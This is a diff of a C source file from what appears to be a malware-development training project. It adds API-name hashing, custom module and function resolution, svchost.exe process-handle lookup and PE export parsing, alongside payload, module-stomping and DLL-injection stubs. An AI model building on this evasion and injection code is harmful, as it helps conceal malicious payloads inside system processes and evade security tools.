@@ -1,5 +1,7 @@
 ﻿#include "../Headers/main.h"
 
+#include "../HasahingAPI.h"
+
 int main()
 {
 	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
@@ -16,7 +18,8 @@ int main()
 								  dwOldProtections			= 0,
 								  dwThreadId				= 0,
 								  dwThreadId1				= 0,
-								  dwThreadId2				= 0;
+								  dwThreadId2				= 0,
+								  dwHashedString			= 0;
 
 	PUCHAR						  pObfInput					= NULL,
 								 *pObfOutput				= NULL,
@@ -34,38 +37,53 @@ int main()
 	PVOID						  pExPayload				= NULL,
 								  pStompingTarget			= NULL;
 	HANDLE						  hHeap						= INVALID_HANDLE_VALUE;
-	PBYTE						  pImageData				= NULL;
-	LPWSTR						  pImagePath				= NULL;
+	PBYTE						  pImageData				= NULL,
+								  pProcessBaseAddress		= NULL;
+	LPWSTR						  pImagePath				= NULL,
+								  pImagePath2				= NULL;
 	PIMAGE_DOS_HEADER			  pImageDOSHeader_t			= NULL;
 	PIMAGE_NT_HEADERS			  pImageNtHeaders_t			= NULL;
 	PIMAGE_TLS_DIRECTORY		  pImageTlsDirectory_t		= NULL;
 	PIMAGE_FILE_HEADER			  pImageFileHeader_t		= NULL;
 	PIMAGE_SECTION_HEADER		  pImageSection_Entry		= NULL;
+	PIMAGE_SECTION_HEADER		  pImageSection_Entry_idata	= NULL;
 	PIMAGE_OPTIONAL_HEADER		  pImageOptionalHeaders_t	= NULL;
 	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir_t = NULL;
 	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRtFuncDirectory_t	= NULL;
 	PIMAGE_IMPORT_DESCRIPTOR	  pImageImportDirectory_t	= NULL;
 	PIMAGE_EXPORT_DIRECTORY		  pImageExportDirectory		= NULL;
-	LPSTR						  pTargetProcessName		= "RuntimeBroker.exe";
+	LPWSTR						  pTargetStringToHash		= L"MaldevAcademy";
 	LPWSTR						  TargetProcessName			= L"svchost.exe";
-
+	HMODULE						  hModuleCustom				= NULL;
 	//if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
+	//printf("[!] Hashing Strings!\n");
 
-	EnumRemoteProcessHandle(TargetProcessName, &dwPID0, &hProcess);
+	dwHashedString = HashStringRotr32W(pTargetStringToHash, 5);
 
-	//if (EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess) == FALSE) return -2;
+	hModuleCustom = GetModuleHandleReplacement(L"KernelBase.dll");
 
-	if (!FetchPathFromRunningProcess(hProcess, &pImagePath)) return -3;
+	//wprintf(L"\t[+] Hash Of \"%s\" is: 0x%lX\n",pTargetStringToHash, dwHashedString);
 
-	FetchImageData(pImagePath, hHeap, &pImageData);
+	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess) == FALSE) printf(":(\n");
 
-	pImageSection_Entry = FindImageSectionHeaderByName(".rdata", NULL, 0, pImageData);
+	FetchPathFromRunningProcess(hProcess, &pImagePath);
+
+	printf("Starting PE Parser...\n");
+
+	if (FetchImageData(L"C:\\WINDOWS\\System32\\kernel32.dll", hHeap, &pImageData) == TRUE)
+	{
+		printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
+	}
 
 	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);
 
 	FetchImageNtHeaders(pImageData, &pImageNtHeaders_t);
 
 	FetchImageOptionalHeaders(pImageData, &pImageOptionalHeaders_t);
+
+	FetchImageExportDirectory(pImageData, &pImageExportDirectory);
+
+	FetchImageImportDirectory(pImageData, &pImageImportDirectory_t);
 
 	FetchImageTlsDirectory(pImageData, &pImageTlsDirectory_t);
 
@@ -74,19 +92,28 @@ int main()
 	FetchImageBaseRelocDirectory(pImageData, &pImageBaseRelocationDir_t);
 
 	FetchImageFileHeader(pImageData, &pImageFileHeader_t);
-
-	FetchImageImportDirectory(pImageData, &pImageImportDirectory_t);
-
-	FetchImageExportDirectory(pImageData, &pImageExportDirectory);
-
+	PDWORD pRVAsOfNames = (PDWORD)(pImageData + pImageExportDirectory->AddressOfNames);
+	/*
+	for (int i = 0; i < pImageExportDirectory->NumberOfNames; i++)
+	{
+		printf("\t[%.4d] %s\n", i + 1, (char *)pImageData + pRVAsOfNames[i]);
+	}
+	*/
 	FetchImageSection(pImageData, &pImageSection_Entry);
 
+	GetProcessAddressReplacement(GetModuleHandleW(L"NTDLL.dll"), "NtQuerySystemInformation");
 
+	pImageSection_Entry_idata = FindImageSectionHeaderByName(".pdata", pImageSection_Entry, (BYTE)pImageFileHeader_t->NumberOfSections, pImageData);
 
+	printf("%s\n", (char*)pImageSection_Entry_idata->Name);
 
-	for (DWORD i = 0; i < pImageFileHeader_t->NumberOfSections; i++) {
-		PIMAGE_SECTION_HEADER candidate = (PIMAGE_SECTION_HEADER)((PBYTE)pImageSection_Entry + sizeof(IMAGE_SECTION_HEADER) * i);
-		printf("%s\n", (char *)candidate->Name);
+	for (DWORD i = 0; i < pImageFileHeader_t->NumberOfSections; i++) 
+	{
+		PDWORD pFuncNameArray = (PDWORD)pImageData + pImageExportDirectory->AddressOfNames;
+
+		char* pFuncName = (char*)(pImageData + pFuncNameArray[i]);
+
+		printf("%s\n", pFuncName);
 
 	}
 
@@ -220,7 +247,7 @@ int main()
 //MapLocalMemory(pObfInput, &pExPayload, resource.sSize, &hPayloadObjectHandle);
 
 
-/*if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess))
+/*if (!FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess))
 {
 wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
 	return -1;
@@ -361,9 +388,9 @@ for (int i = 0; i < 10; i++) {
 
 	//if ((hProcess =OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID0)) == INVALID_HANDLE_VALUE) return -2;
 
-	//if (!EnumRemoteProcessHandle(L"Notepad.exe", &dwPID0, &hProcess)) printf("[!] Enumerate Remote Processes Handles Failed To Find Chrome\n");
+	//if (!FetchProcessHandleEnumProcesses(L"Notepad.exe", &dwPID0, &hProcess)) printf("[!] Enumerate Remote Processes Handles Failed To Find Chrome\n");
 
-	//hProcess2 = FetchProcess(L"Notepad.exe", &pid2);
+	//hProcess2 = FetchProcessHandleHelpTool32(L"Notepad.exe", &pid2);
 
 	//if (!(hThread= CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&FetchDrives,  NULL, CREATE_SUSPENDED, &dwThreadId))) return FALSE;
 
@@ -485,9 +512,9 @@ for (int i = 0; i < 10; i++) {
 
 	if (!FetchResource(&resource)) return -1;
 
-	if (!EnumRemoteProcessHandle(L"svchost.exe", &dwProcessId, &hProcess)) return -2;
+	if (!FetchProcessHandleEnumProcesses(L"svchost.exe", &dwProcessId, &hProcess)) return -2;
 
-	//if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }
+	//if ((hProcess = FetchProcessHandleHelpTool32(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }
 
 	//if (!InjectRemoteDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;
 
